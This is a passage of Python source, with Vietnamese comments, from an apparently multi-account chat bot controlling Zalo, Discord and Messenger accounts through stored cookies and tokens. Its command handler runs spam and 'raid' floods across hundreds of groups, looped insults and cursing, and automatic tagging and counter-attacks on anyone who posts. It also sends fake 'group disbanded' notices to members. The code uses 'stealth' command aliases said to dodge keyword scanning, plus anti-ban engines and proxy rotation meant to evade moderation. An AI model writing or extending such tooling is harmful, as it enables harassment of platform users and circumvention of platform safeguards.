                                seen.add(cid)
                                out.append({"id": cid, "name": c["name"], "type": c["type"]})
            return out if out else [base_target]

        return [base_target]


def extract_multigroup_spec_and_clean_body(raw_body_str, cmd_token=""):
    """Bóc tách thông minh các tham số chọn nhóm & tag all ở bất kỳ vị trí nào trong câu lệnh (.g / .n / .xa):
    Hỗ trợ:
    - `allnhom`, `allbox`, `allgroup`, `fullbox`, `fullnhom`, `tatcanhom`, `nhom=all`, `box=all` -> Gửi ALL nhóm!
    - `200nhom`, `50nhom`, `200box`, `nhom=200`, `box=50`, `sonhom=200` -> Gửi N nhóm!
    - `nhom=1,2,3`, `nhom=1-200`, `box=1-50`, `nhom=ID1,ID2` -> Gửi các nhóm cụ thể!
    - `tagall`, `tag=all`, `@all`, `@everyone`, `@here` -> Tự động bật Tag All!"""
    spec_mode = "all" if cmd_token in ("gall", "gll", "ngonall", "nall", "nll", "nhayall", "xaall") else "current"
    spec_val = None
    inline_tag_all = False

    if not raw_body_str:
        return "", spec_mode, spec_val, inline_tag_all

    kept_lines = []
    for raw_ln in str(raw_body_str).replace("\r\n", "\n").replace("\r", "\n").split("\n"):
        if not raw_ln.strip():
            kept_lines.append("")
            continue
        lead_len = len(raw_ln) - len(raw_ln.lstrip(" \t"))
        lead_ws = raw_ln[:lead_len]
        line_tokens = raw_ln[lead_len:].split(" ")
        kept_line_tokens = []
        for tk in line_tokens:
            tk_clean = tk.strip()
            if not tk_clean:
                kept_line_tokens.append(tk)
                continue
            tk_low = remove_vn_accents(tk_clean.lower())
            if tk_low in ("allnhom", "allbox", "allgroup", "fullbox", "fullnhom", "tatcanhom", "moinhom", "nhom=all", "box=all", "group=all", "gui=all"):
                spec_mode = "all"
                spec_val = "all"
                continue
            m_num_box = re.match(r"^(\d+)(?:nhom|box|group|kenh|phong)$", tk_low)
            if m_num_box:
                spec_mode = "count"
                spec_val = int(m_num_box.group(1))
                continue
            m_kv_box = re.match(r"^(?:nhom|box|group|sonhom|sobox|kenh|gui)=(.+)$", tk_low)
            if m_kv_box:
                val_part = m_kv_box.group(1).strip()
                if val_part in ("all", "full", "tatca", "het"):
                    spec_mode = "all"
                    spec_val = "all"
                elif val_part.isdigit() and len(val_part) <= 4:
                    spec_mode = "count"
                    spec_val = int(val_part)
                elif re.match(r"^(\d+)(?:nhom|box)$", val_part):
                    spec_mode = "count"
                    spec_val = int(re.match(r"^(\d+)", val_part).group(1))
                else:
                    spec_mode = "custom"
                    spec_val = val_part
                continue
            if tk_low in ("tagall", "tag=all", "@all", "@everyone", "@here", "tag_all"):
                inline_tag_all = True
                continue
            kept_line_tokens.append(tk)
        joined_ln = " ".join(kept_line_tokens).rstrip()
        if joined_ln:
            kept_lines.append(lead_ws + joined_ln)
    return "\n".join(kept_lines).strip("\r\n"), spec_mode, spec_val, inline_tag_all

def parse_and_execute_inchat_command(
    zalo_client, acc_row, thread_id, is_group, sender_id, raw_msg,
    raw_mentions=None, discord_client=None, platform="zalo", messenger_client=None,
    pre_claimed_slot=False, sender_name="", msg_id=None, reply_target=None,
    cli_msg_id=None, msg_ts=None, raw_msg_obj=None
):
    if not raw_msg:
        return False

    if is_system_echo_message(text=raw_msg):
        return False

    text = strip_invisible_chars(str(raw_msg))
    if not text:
        return False

    if "<nội dung>" in text or "<số thứ tự file>" in text or "[@Tên / @All]" in text or "• .spam" in text:
        return False

    custom_prefix = (acc_row.get("cmd_prefix") or ".").strip()
    valid_prefixes = tuple(set([custom_prefix, ".", "/", "!"]))
    if not text.startswith(valid_prefixes):
        return False

    s_uid = str(sender_id or "").strip()
    if platform == "zalo" and zalo_client:
        my_uid = str(zalo_client.uid or acc_row.get("uid") or "").strip()
        my_s2m = str(getattr(zalo_client, "send2me_id", "") or "").strip()
    elif discord_client:
        my_uid = str(discord_client.user_id or acc_row.get("uid") or "").strip()
        my_s2m = ""
    elif messenger_client:
        my_uid = str(messenger_client.uid or acc_row.get("uid") or "").strip()
        my_s2m = ""
    else:
        my_uid = str(acc_row.get("uid") or "").strip()
        my_s2m = ""

    first_space = text.find(" ")
    if first_space == -1:
        cmd_token = text[1:].lower().strip()
        arg_body = ""
        prefix_u16_offset = utf16_len(text)
    else:
        cmd_token = text[1:first_space].lower().strip()
        raw_after_space = text[first_space + 1:]
        arg_body = raw_after_space.lstrip(" \t").rstrip() if not raw_after_space.startswith("\n") else raw_after_space.lstrip("\r\n").rstrip()
        leading_sp = len(raw_after_space) - len(raw_after_space.lstrip())
        prefix_u16_offset = utf16_len(text[:first_space + 1 + leading_sp])

    cmd_token = normalize_cmd_homoglyphs(cmd_token)
    if not cmd_token:
        return False

    # Ánh xạ lệnh tắt tàng hình (Stealth Short Aliases) giúp gõ lệnh trên Discord siêu nhanh & chống quét từ khóa
    shorthand_color_arg_map = {
        "mauword": "word",
        "mautu": "word",
        "mauchar": "char",
        "maukytu": "char",
        "maurainbow": "rainbow",
        "maudong": "rainbow",
        "maudo": "do",
        "maucam": "cam",
        "mauvang": "vang",
        "mauxanh": "xanh",
        "mauxanhla": "xanh",
        "mauxanhduong": "xanhduong",
        "maungoc": "ngoc",
        "mautim": "tim",
        "mauhong": "hong",
        "maulua": "fire",
        "maufire": "fire",
        "maubien": "ocean",
        "mauocean": "ocean",
        "mauhoanggia": "royal",
        "mauroyal": "royal",
        "maucyber": "cyber",
        "mauneon": "cyber",
        "maurandom": "random",
        "mautat": "tat",
        "mauoff": "tat",
    }
    if cmd_token in shorthand_color_arg_map:
        arg_body = shorthand_color_arg_map[cmd_token]
        cmd_token = "mau"

    stealth_alias_map = {
        "m": "menu",
        "h": "help",
        "s": "spam",
        "n": "nhay",
        "g": "ngon",
        "r": "raid",
        "a": "auto",
        "dao": "auto",
        "hi": "chao",
        "f": "file",
        "ds": "files",
        "af": "addfile",
        "taof": "addfile",
        "themnhay": "addnhay",
        "taonhay": "addnhay",
        "themngon": "addngon",
        "taongon": "addngon",
        "setnhay": "chonnhay",
        "filenhay": "chonnhay",
        "setngon": "chonngon",
        "filengon": "chonngon",
        "chedochonfile": "chonfile",
        "p": "ping",
        "stinfo": "status",
        "tv": "mem",
        "thanhvien": "mem",
        "d": "delay",
        "ab": "antiband",
        "cp": "chophep",
        "xq": "xoaquyen",
        "dsq": "dsquyen",
        "t": "stop",
        "st": "stop",
        "ta": "stopall",
        "soifull": "soi",
        "scanbox": "soi",
        "dsbox": "soi",
        "listbox": "soi",
        "dsnhom": "soi",
        "gll": "gall",
        "ngonall": "gall",
        "nll": "nall",
        "nhayall": "nall",
        "do": "treodo",
        "treodamau": "damau",
        "treogif": "gif",
        "tungmau": "word",
        "nt": "nhaytag",
        "treopoll": "nhaypoll",
        "treotenbox": "nhaynamebox",
        "satthuong": "chui",
        "gtan": "giaitan",
        "spamgiaitan": "nhaygiaitan",
        "giaitannhom": "giaitan",
        "nhandan": "sticker",
        "stkr": "sticker",
        "taosticker": "sticker",
        "nhaysticker": "treosticker",
        "stickerloop": "treosticker",
        "taoqr": "qr",
        "qrzalo": "qr",
        "getqr": "qr",
        "thaicon": "react",
        "tim": "react",
        "accs": "checkacc",
        "dsacc": "checkacc",
    }
    cmd_token = stealth_alias_map.get(cmd_token, cmd_token)

    # Tự động khóa nhận diện UID chủ tài khoản nếu Acc vừa nạp Cookie + IMEI chưa kịp đồng bộ UID số
    if platform == "zalo" and (not my_uid or not my_uid.isdigit()) and s_uid and s_uid.isdigit() and cmd_token in VALID_SYSTEM_CMD_TOKENS:
        my_uid = s_uid
        if zalo_client:
            zalo_client.uid = s_uid
            zalo_client.send2me_id = s_uid
        OWNER_UIDS_CACHE.add(s_uid)
        try:
            conn_u = db()
            conn_u.execute("UPDATE accounts SET uid=? WHERE id=? AND (uid IS NULL OR uid='' OR uid=imei)", (s_uid, acc_row["id"]))
            conn_u.commit()
            conn_u.close()
            refresh_accounts_ram_cache()
        except Exception:
            pass

    allow_all_flag = bool(acc_row.get("allow_all_cmd", 1))
    is_true_owner = is_true_account_owner(
        s_uid, client_uid=my_uid, client_send2me_id=my_s2m, platform=platform
    )
    is_authorized_sender = is_user_authorized_for_cmd(
        s_uid, my_uid, my_s2m, allow_all=allow_all_flag, sender_name=sender_name,
        platform=platform, thread_id=thread_id, cmd_token=cmd_token
    )
    is_owner = is_true_owner or is_authorized_sender

    # BẮT BUỘC 100%: Chỉ Chủ Acc (is_true_owner) và người được Chủ Acc cấp quyền (.cp) mới được phép dùng lệnh!
    # Cấm tuyệt đối 100% mọi người lạ khác trong nhóm sử dụng lệnh!
    if not is_owner:
        return False

    if not pre_claimed_slot:
        if not claim_command_execution_slot(platform, thread_id, s_uid, text, msg_id=msg_id, cli_msg_id=cli_msg_id, msg_ts=msg_ts, acc_id=acc_row.get("id")):
            return False

    acc_id = acc_row["id"]
    if platform == "discord":
        target_obj = [{
            "id": str(thread_id),
            "name": f"Discord_{str(thread_id)[-5:]}",
            "type": "discord_channel"
        }]
    elif platform == "messenger":
        target_obj = [{
            "id": str(thread_id),
            "name": f"Mess_{str(thread_id)[-5:]}",
            "type": "messenger_thread"
        }]
    else:
        target_obj = [{
            "id": str(thread_id),
            "name": f"Chat_{str(thread_id)[-6:]}",
            "type": "group" if is_group else "user"
        }]

    if my_uid:
        OWNER_UIDS_CACHE.add(my_uid)
    if my_s2m:
        OWNER_UIDS_CACHE.add(my_s2m)

    if platform == "zalo" and thread_id:
        HOT_ACTIVE_ZALO_GROUPS.add(str(thread_id))
    elif platform == "discord" and thread_id:
        DiscordStealthAntiBanEngine.ACTIVE_DISCORD_POLL_CHANNELS[acc_id].add(str(thread_id))

    def _send_reply(msg_txt, broadcast_all_accs=None, reply_color_mode="none", reply_fixed_color="red"):
        """Phản hồi lệnh siêu tốc 0.00ms qua làn ưu tiên _PRIORITY_CMD_EXECUTOR (priority_bypass=True):
        - Khi sử dụng nhiều Acc cùng lúc trong nhóm, tự động điều phối cho các Acc đang hoạt động cùng phản hồi đều nhau không bị nghẽn hay lỗi!"""
        now_rep = time.time()
        rep_norm = _normalize_for_echo_hash(msg_txt)
        rep_key = f"outrep:acc{acc_id}:{platform}:{_clean_zalo_id(thread_id) or thread_id}:{rep_norm}"
        with GLOBAL_CMD_DEDUPE_LOCK:
            if now_rep - GLOBAL_CMD_DEDUPE_CACHE.get(rep_key, 0.0) < 3.5:
                return
            GLOBAL_CMD_DEDUPE_CACHE[rep_key] = now_rep
        register_system_sent_message(text=msg_txt)
        with SYSTEM_CFG_LOCK:
            acc_filter_cfg = SYSTEM_RUNTIME_CONFIG.get("active_acc_filter", "ALL")
            single_rep_cfg = bool(SYSTEM_RUNTIME_CONFIG.get("single_reply_mode", True))
        if str(acc_filter_cfg).upper() != "ALL" and str(acc_filter_cfg).isdigit():
            if int(acc_row.get("id") or 0) != int(acc_filter_cfg):
                only_acc = get_account_from_ram(int(acc_filter_cfg))
                if only_acc:
                    acc_row = only_acc
        if broadcast_all_accs is None:
            # Mặc định phản hồi gọn gàng bằng đúng Acc nhận lệnh (tránh nhiều Acc cùng nhắn bảng thông báo gây loạn/rối!)
            broadcast_all_accs = (not single_rep_cfg) and (cmd_token not in ("menu", "help", "lenh", "hdsd", "files", "dsfile", "listfile"))
        if not broadcast_all_accs:
            target_accs = [acc_row]
        else:
            target_accs = get_accounts_present_in_thread(
                platform=platform, thread_id=thread_id, is_group=is_group, fallback_acc_row=acc_row
            )

        def _reply_for_acc(idx_a, a_item):
            if idx_a > 0:
                time.sleep(min(0.18, idx_a * 0.03))
            a_name = a_item.get("name") or f"Acc #{a_item.get('id')}"
            out_txt = f"⚡ [{a_name}]\n{msg_txt}" if len(target_accs) > 1 else msg_txt
            register_system_sent_message(text=out_txt)
            if platform == "zalo":
                try:
                    zc = zalo_client if (a_item.get("id") == acc_id and zalo_client) else Zalo.get_pooled_client(
                        a_item["imei"], a_item["cookies"],
                        user_agent=a_item.get("user_agent") or "",
                        zpw_enk_hint=a_item.get("zpw_enk") or "",
                        uid_hint=a_item.get("uid") or ""
                    )
                    zc.send_adv(
                        out_txt, thread_id, color_mode=reply_color_mode or "none", fixed_color=reply_fixed_color or "red",
                        is_group=is_group, is_heading=(reply_color_mode != "none"), antiband=False,
                        use_emoji=False, icon_count=0, auto_retry_thread_type=True,
                        parse_auto_tags=False, priority_bypass=True
                    )
                except Exception:
                    pass
            elif platform == "discord":
                DiscordStealthAntiBanEngine.ACTIVE_DISCORD_POLL_CHANNELS[a_item.get("id", acc_id)].add(str(thread_id))
                try:
                    dc = discord_client if (a_item.get("id") == acc_id and discord_client) else DiscordClient(
                        a_item["token"], is_bot=bool(a_item.get("is_bot", 0))
                    )
                    dc.send_message(
                        thread_id, out_txt, color_mode=reply_color_mode or "none", fixed_color=reply_fixed_color or "red",
                        antiband=True, is_heading=False, priority_bypass=True
                    )
                except Exception:
                    pass
            elif platform == "messenger":
                MessengerStealthAntiBanEngine.ACTIVE_MESSENGER_POLL_THREADS[a_item.get("id", acc_id)].add(str(thread_id))
                try:
                    mc = messenger_client if (a_item.get("id") == acc_id and messenger_client) else MessengerClient.get_pooled_client(
                        a_item["cookies"], uid=a_item.get("uid") or ""
                    )
                    mc.send_message(
                        thread_id, out_txt, is_group=bool(is_group), antiband=False, is_heading=False, priority_bypass=True
                    )
                except Exception:
                    pass

        for idx_a, a_item in enumerate(target_accs[:12]):
            _PRIORITY_CMD_EXECUTOR.submit(_reply_for_acc, idx_a, a_item)

    if cmd_token in ("menu", "help", "lenh", "bot", "hdsd"):
        with SYSTEM_CFG_LOCK:
            cur_d = SYSTEM_RUNTIME_CONFIG["delay"]
            cur_c = SYSTEM_RUNTIME_CONFIG["color_mode"]
            cur_ic = SYSTEM_RUNTIME_CONFIG["icon_count"]
        vip_st = "ON" if DiscordStealthAntiBanEngine.SUPER_VIP_MODE else "OFF"
        if platform == "discord":
            help_txt = (
                f"⚡ HỆ THỐNG ĐIỀU KHIỂN 50+ ACC × 200+ NHÓM (PRX Turbo 0s: {vip_st}):\n"
                "• .soi (hoặc .dsbox) — Tự động soi full toàn bộ cuộc trò chuyện & kênh Discord\n"
                "• .g <file/nd> [@Tên] [@all] [allnhom | 200nhom | nhom=1-200] — Treo ngôn đa nhóm / All nhóm 0s\n"
                "• .n <file/nd> [@Tên] [@all] [allnhom | 200nhom | nhom=1,2,3] — Treo nhây từng dòng đa nhóm 0s\n"
                "• .gall <file/nd> [@Tên] [@all] | .nall <file/nd> [@Tên] [@all] — Phang ALL 200+ nhóm đồng loạt\n"
                "• .xa <file/nd> [@Tên] [allnhom] — Siêu xả 50 Acc × 200 Nhóm 0s | .combo (Xả 3 câu/nhịp)\n"
                "• .prx <add/list/test/on/off> — Quản lý Hồ Proxy Siêu Trâu 0ms Failover\n"
                "• .f <số file> | .ds (Xem file) | .af <tên> | <nd> (Tạo file)\n"
                f"• .d <giây> (Hiện tại: {cur_d}s) | .cp @Tên (Cấp quyền) | .xq @Tên (Xóa quyền)\n"
                "• .t (Dừng phòng này) | .ta (Dừng tất cả 200 nhóm)"
            )
        elif platform == "messenger":
            help_txt = (
                "⚡ HỆ THỐNG MESSENGER MQTT Đa Luồng:\n"
                "• .nhay <nd / số file> [@Tên / @All] (Tắt: .n)\n"
                "• .ngon <nd / số file> [@Tên / @All] (Tắt: .g)\n"
                "• .xa <nd / số file> [@Tên] — Siêu xả đa nhóm MQTT 0s\n"
                "• .combo <nd / số file> [@Tên] | .raid (.r) | .auto (.a)\n"
                "• .theme <tên / random> (.setnen) — Đổi nền MQTT\n"
                "• .poll <câu hỏi> | <ý 1> ; <ý 2> (.nhaypoll) — Tạo Poll MQTT\n"
                "• .sharelink <url> | <nd> | .sharecontact [@Tên]\n"
                "• .typing <on/off> | .tenbox <tên mới> | .setname <biệt danh> [@Tên]\n"
                f"• .delay <giây> ({cur_d}s) | .icon <0-10> ({cur_ic}) | .files (.ds)\n"
                "• .ping | .status | .id | .mem | .stop (.t) | .stopall (.ta)"
            )
        else:
            with SYSTEM_CFG_LOCK:
                sel_f_now = SYSTEM_RUNTIME_CONFIG.get("selected_file_by_acc", {}).get(str(acc_id)) or SYSTEM_RUNTIME_CONFIG.get("selected_file") or "Chưa chọn (.f <số>)"
            with SYSTEM_CFG_LOCK:
                nhay_f_now = SYSTEM_RUNTIME_CONFIG.get("selected_nhay_by_acc", {}).get(str(acc_id)) or SYSTEM_RUNTIME_CONFIG.get("selected_nhay_file", "nhay.txt")
                ngon_f_now = SYSTEM_RUNTIME_CONFIG.get("selected_ngon_by_acc", {}).get(str(acc_id)) or SYSTEM_RUNTIME_CONFIG.get("selected_ngon_file", "ngon.txt")
            with SYSTEM_CFG_LOCK:
                acc_flt_now = SYSTEM_RUNTIME_CONFIG.get("active_acc_filter", "ALL")
            active_accs_cnt = len(get_all_accounts_from_ram(platform="zalo", enabled_only=True))
            flt_lbl = f"TẤT CẢ ({active_accs_cnt} Acc)" if str(acc_flt_now).upper() == "ALL" else f"Acc #{acc_flt_now}"
            help_txt = (
                f"👑 HỆ THỐNG ĐA ACC ZALO VIP ({APP_VERSION})\n"
                f"👨‍💻 Author: {APP_AUTHOR} • Chế độ Acc: {flt_lbl} • Delay: {cur_d}s\n"
                f"📂 File đang chọn: Nhây=[{nhay_f_now}] • Ngôn=[{ngon_f_now}]\n"
                "━━━━━━━━━━━━━━━\n"
                "🎨 CẮT KHUNG NHÃN DÁN STICKER & MÃ QR THẬT:\n"
                "• .sticker — Kéo trả lời (Reply) vào ảnh/video ≤3s (hoặc kèm chữ/link) tự cắt khung nhảy ra Nhãn Dán thật 100%\n"
                "• .qr — Tạo ảnh Mã QR Zalo PC thật ngay trên Zalo (Quét là tự kết nối vào Bot & Tele luôn)\n"
                "• .gif [meo/corgi/khia/rong/vit/gau] | .treosticker — Bắn 68+ Sticker & GIF động\n"
                "━━━━━━━━━━━━━━━\n"
                "📢 GIẢI TÁN KHÔNG CẦN KEY & QUẢN LÝ FILE TRÊN ZALO:\n"
                "• .nhaygiaitan [tên] | .giaitan [tên] — Báo 'Nhóm đã được giải tán' chuẩn API Zalo tới mọi mem trong Box (Không cần Key!)\n"
                "• .addnhay <tên.txt> | <nd> (Hoặc Reply file .txt / đoạn chữ trên Zalo) — Thêm File thẳng trên Zalo\n"
                "• .addngon <tên.txt> | <nd> | .addfile | .chonfile <số> | .files (.ds)\n"
                "━━━━━━━━━━━━━━━\n"
                "🔥 TREO NGÔN, NHÂY & ĐIỀU KHIỂN ĐA ACC MƯỢT 0MS:\n"
                "• .n (Nhây dòng) | .g (Treo ngôn) | .treodo | .damau | .word | .xa | .combo | .2c | .so | .chui\n"
                "• .anall (Tag All ẩn) | .antan @Tên | .nhaytag @Tên | .chan (Bám sát 0s)\n"
                "• .nhaypoll (.poll) | .tenbox | .theme | .todo | .bank | .card | .react | .undo | .addmem\n"
                "• .acc <ID / all> (Chọn chạy 1 Acc hoặc Tất cả Acc) | .checkacc | .cp @Tên | .xq @Tên\n"
                "━━━━━━━━━━━━━━━\n"
                "🛑 DỪNG LỆNH: .t / .stop (Dừng Box này) | .ta / .stopall (Dừng tất cả)"
            )
        _send_reply(help_txt)
        log_system_command(acc_id, thread_id, sender_id, text, f"Hiển thị .menu ({platform})")
        return True

    if cmd_token in ("prx", "proxy"):
        sub_arg = arg_body.strip()
        sub_low = sub_arg.lower()
        if not sub_arg or sub_low in ("list", "status", "check"):
            snap_p = ProxyPoolEngine.get_snapshot()
            st_lbl = "ĐANG BẬT (Turbo Failover 0ms)" if snap_p["enabled"] else "ĐANG TẮT (Direct Keep-Alive)"
            _send_reply(
                f"🌐 HỆ THỐNG PROXY POOL (PRX TURBO):\n"
                f"• Trạng thái: {st_lbl}\n"
                f"• Tổng Proxy: {snap_p['total']} (Khỏe: {snap_p['healthy']} | Đang cách ly: {snap_p['cooling']})\n"
                f"• Đã định tuyến: {snap_p['routed_ok']} gói | Tự chuyển mạch 0ms: {snap_p['failover_hits']} lần\n"
                f"• Cú pháp: .prx add ip:port:user:pass | .prx test | .prx on | .prx off | .prx clear"
            )
        elif sub_low in ("on", "bat", "1"):
            snap_p = ProxyPoolEngine.get_snapshot()
            ProxyPoolEngine.save_proxies(snap_p["proxies_text"], enabled=True)
            _send_reply("✅ Đã BẬT chế độ Proxy Pool Turbo (Xoay vòng Proxy + Tự động chuyển mạch 0ms không bao giờ đơ tin nhắn)!")
        elif sub_low in ("off", "tat", "0"):
            snap_p = ProxyPoolEngine.get_snapshot()
            ProxyPoolEngine.save_proxies(snap_p["proxies_text"], enabled=False)
            _send_reply("⚡ Đã chuyển sang chế độ Direct Keep-Alive trực tiếp tốc độ cao!")
        elif sub_low in ("clear", "xoa", "del"):
            ProxyPoolEngine.save_proxies("", enabled=True)
            _send_reply("🗑️ Đã xóa sạch danh sách Proxy trong hồ chứa!")
        elif sub_low in ("test", "kiemtra"):
            _send_reply("🔍 Đang kiểm tra & xếp hạng tốc độ dàn Proxy siêu tốc...")
            def _bg_prx_test():
                res_t = ProxyPoolEngine.test_all_proxies(timeout_sec=1.5)
                _send_reply(f"✅ {res_t['message']}")
            _PRIORITY_CMD_EXECUTOR.submit(_bg_prx_test)
        else:
            raw_p = sub_arg[4:].strip() if sub_low.startswith("add ") else sub_arg
            added_c, total_c = ProxyPoolEngine.add_proxies_incremental(raw_p)
            _send_reply(f"🚀 Đã nạp thêm {added_c} Proxy mới (Tổng: {total_c} Proxy sẵn sàng truyền tin siêu tốc 0ms)!")
        log_system_command(acc_id, thread_id, sender_id, text, "Điều khiển Proxy Pool (.prx)")
        return True

    if cmd_token in ("chan", "bam", "bamsat", "chanall"):
        sub_c = arg_body.strip()
        if sub_c.lower() in ("off", "tat", "0", "stop", "dung"):
            with AUTO_INTERCEPT_LOCK:
                AUTO_INTERCEPT_BOXES.pop(str(thread_id), None)
            _send_reply("Đã tắt chế độ bám sát tự động tại phòng này.", broadcast_all_accs=False)
        else:
            blocks_c = get_blocks_from_file_query(sub_c if sub_c else "latest", mode="treo_nhay")
            if not blocks_c:
                blocks_c = [x.strip() for x in sub_c.split(";") if x.strip()] if sub_c else [
                    "Gặp thằng nào phang thằng đấy tốc độ 0s!",
                    "Bám sát mục tiêu không delay!",
                    "Đè bẹp đối thủ ngay lập tức!"
                ]
            with AUTO_INTERCEPT_LOCK:
                AUTO_INTERCEPT_BOXES[str(thread_id)] = {
                    "enabled": True,
                    "platform": platform,
                    "blocks": blocks_c,
                    "idx": 0,
                }
            _send_reply(f"Đã bật chế độ Bám Sát & Chặn Mục Tiêu 0s ({len(blocks_c)} câu) tại box {thread_id}: Ai nhắn vào sẽ tự động bị tag và phản đòn tức thì!", broadcast_all_accs=False)
        log_system_command(acc_id, thread_id, sender_id, text, f"Bật/Tắt chế độ .chan/.bam ({platform})")
        return True

    if cmd_token in ("soi",):
        conv_list = FullConversationAutoScanner.scan_full_conversations(platform, force_refresh=False)
        if not conv_list:
            conv_list = FullConversationAutoScanner.scan_full_conversations(platform, force_refresh=True)
        else:
            threading.Thread(target=FullConversationAutoScanner.scan_full_conversations, args=(platform, True), daemon=True).start()
        total_c = len(conv_list)
        box_mems = []
        sibling_channels = []
        try:
            if platform == "discord" and discord_client:
                box_mems = discord_client.get_box_members(thread_id, use_cache=True)
                cur_guild_id = DiscordStealthAntiBanEngine.CHANNEL_GUILD_MAP.get(str(thread_id))
                if cur_guild_id:
                    sibling_channels = [c for c in conv_list if str(c.get("guild_id") or "") == str(cur_guild_id)]
            elif platform == "zalo" and zalo_client:
                box_mems = zalo_client.get_members_full(thread_id, use_cache=True)
            elif platform == "messenger" and messenger_client:
                box_mems = messenger_client.get_thread_members(thread_id, use_cache=True)
        except Exception:
            pass

        if not sibling_channels:
            sibling_channels = conv_list[:30]

        ch_lines = [f"#{c.get('display_idx', idx+1)}. {c['name']} (ID: {c['id']})" for idx, c in enumerate(sibling_channels[:30])]
        if platform == "discord":
            mem_tags_str = " ".join(f"<@{m['uid']}>" for m in box_mems[:40] if str(m.get("uid", "")).isdigit())
        else:
            mem_tags_str = " ".join(f"@{m['name']}" for m in box_mems[:40] if m.get("name"))

        soi_report = (
            f"📌 SOI BOX HIỆN TẠI (ID: {thread_id}) • TỔNG HỆ THỐNG: {total_c} NHÓM/KÊNH\n"
            f"• Thành viên trong box ({len(box_mems)} người): {mem_tags_str if mem_tags_str else '@everyone'}\n"
            f"• Danh sách nhóm/kênh của Box ({len(sibling_channels)} kênh):\n"
            + ("\n".join(ch_lines) if ch_lines else f"#1. Box hiện tại (ID: {thread_id})")
            + "\n\n⚡ LỆNH GỬI NHANH VÀO BOX NÀY HOẶC ĐA NHÓM (0S):\n"
            + f"• Treo ngôn box này: .g <file/nd> @all\n"
            + f"• Treo nhây box này: .n <file/nd> @Tên\n"
            + f"• Gửi toàn bộ {total_c} nhóm: .gall <file/nd> @all | .nall <file/nd> @all\n"
            + "• Bám sát & chặn đối thủ nhắn lại (0s): .chan <file/nd>"
        )
        if platform == "zalo" and zalo_client and box_mems:
            try:
                zalo_client.send_adv(
                    soi_report, thread_id, color_mode="rainbow",
                    is_group=True, mentions=box_mems[:35], tag_all=True,
                    is_heading=False, antiband=True, use_emoji=False, icon_count=0,
                    hide_tag_all=False, hide_tag_name=False
                )
            except Exception:
                _send_reply(soi_report, broadcast_all_accs=False)
        else:
            _send_reply(soi_report, broadcast_all_accs=False)
        log_system_command(acc_id, thread_id, sender_id, text, f"Soi full box {thread_id} ({len(box_mems)} TV, {total_c} nhóm)")
        return True

    if cmd_token in ("2fa", "otp", "totp"):
        sec_str = arg_body.strip()
        code_6, rem_s = generate_totp_rfc6238(sec_str)
        if code_6:
            _send_reply(f"🔐 MÃ OTP 2FA: {code_6} (Hiệu lực còn {rem_s}s)")
        else:
            _send_reply("⚠️ Cú pháp: .2fa <Secret_Key_Base32>")
        log_system_command(acc_id, thread_id, sender_id, text, "Tạo mã 2FA OTP")
        return True

    if cmd_token in ("meta", "ai"):
        q_ai = arg_body.strip()
        if not q_ai:
            _send_reply("🤖 Cú pháp hỏi Trợ Lý Meta AI: .meta <câu hỏi>")
            return True
        def _bg_meta():
            try:
                from get_ck_im_zalo import MetaAIAssistant
                ans = MetaAIAssistant.ask(q_ai)
                _send_reply(f"🤖 [META AI]:\n{ans}")
            except Exception as ex_ai:
                _send_reply(f"⚠️ Lỗi kết nối Meta AI: {ex_ai}")
        _PRIORITY_CMD_EXECUTOR.submit(_bg_meta)
        log_system_command(acc_id, thread_id, sender_id, text, f"Hỏi Meta AI: {q_ai[:30]}")
        return True

    if platform == "discord" and discord_client and cmd_token in ("joinsv", "join"):
        inv_c = arg_body.strip()
        ok_j, msg_j = discord_client.join_server(inv_c)
        _send_reply(f"✅ {msg_j}" if ok_j else f"⚠️ Không thể tham gia Server: {msg_j}")
        log_system_command(acc_id, thread_id, sender_id, text, f"Join Server Discord: {inv_c}")
        return True

    if platform == "discord" and discord_client and cmd_token in ("rename", "doiten"):
        new_n = arg_body.strip() or "NHK VIP"
        ok_rn = discord_client.change_globalname(new_n)
        _send_reply(f"✅ Đã đổi Global Name Discord thành: {new_n}" if ok_rn else "⚠️ Không thể đổi tên lúc này.")
        log_system_command(acc_id, thread_id, sender_id, text, f"Đổi tên Discord: {new_n}")
        return True

    if platform == "discord" and discord_client and cmd_token in ("changeavt", "avt"):
        avt_u = arg_body.strip()
        ok_av = discord_client.change_avatar(avt_u)
        _send_reply("✅ Đã cập nhật Avatar Discord thành công!" if ok_av else "⚠️ Hãy truyền URL ảnh hợp lệ: .changeavt <url_ảnh>")
        log_system_command(acc_id, thread_id, sender_id, text, "Đổi Avatar Discord")
        return True

    if platform == "messenger" and messenger_client and cmd_token in ("block", "unblock"):
        _, t_mentions, _ = extract_trailing_tags_and_resolve(
            arg_body, incoming_mentions=raw_mentions,
            messenger_client=messenger_client, messenger_thread_id=thread_id
        )
        t_uid = t_mentions[0]["uid"] if t_mentions else arg_body.strip()
        if not t_uid or not str(t_uid).isdigit():
            _send_reply(f"⚠️ Cú pháp: .{cmd_token} @Tên hoặc .{cmd_token} <UID>")
            return True
        if cmd_token == "block":
            ok_b = messenger_client.block_user(t_uid)
            _send_reply(f"🚫 Đã chặn UID {t_uid} trên Facebook/Messenger!" if ok_b else "⚠️ Lỗi chặn UID.")
        else:
            ok_b = messenger_client.unblock_user(t_uid)
            _send_reply(f"✅ Đã bỏ chặn UID {t_uid} trên Facebook/Messenger!" if ok_b else "⚠️ Lỗi bỏ chặn UID.")
        log_system_command(acc_id, thread_id, sender_id, text, f"{cmd_token.upper()} UID {t_uid}")
        return True

    if platform == "messenger" and messenger_client and cmd_token in ("addmem", "raidbox"):
        uids_add = [x.strip() for x in re.split(r"[\s,;]+", arg_body.strip()) if x.strip().isdigit()]
        if not uids_add:
            _send_reply("⚠️ Cú pháp thêm thành viên vào Box: .addmem <UID_1> <UID_2>...")
            return True
        ok_add = messenger_client.add_user_to_group(thread_id, uids_add)
        _send_reply(f"✅ Đã gửi lệnh thêm {len(uids_add)} thành viên vào Box!" if ok_add else "⚠️ Không thể thêm thành viên.")
        log_system_command(acc_id, thread_id, sender_id, text, f"Thêm {len(uids_add)} TV vào Box")
        return True

    if platform == "discord" and discord_client and cmd_token in ("statusdc",):
        st_txt = arg_body.strip() or "Hệ Thống"
        discord_client.set_custom_status(st_txt)
        _send_reply(f"👑 Đã đổi trạng thái Custom Status Discord thành: {st_txt}")
        return True

    if platform == "discord" and discord_client and cmd_token in ("hypesquad",):
        h_id = int(arg_body.strip()) if arg_body.strip() in ("1", "2", "3") else 1
        discord_client.set_hypesquad(h_id)
        _send_reply(f"⚡ Đã đổi huy hiệu HypeSquad Discord (House #{h_id})!")
        return True

    if platform == "discord" and discord_client and cmd_token in ("poll1",):
        if "|" in arg_body:
            q_s, o_s = arg_body.split("|", 1)
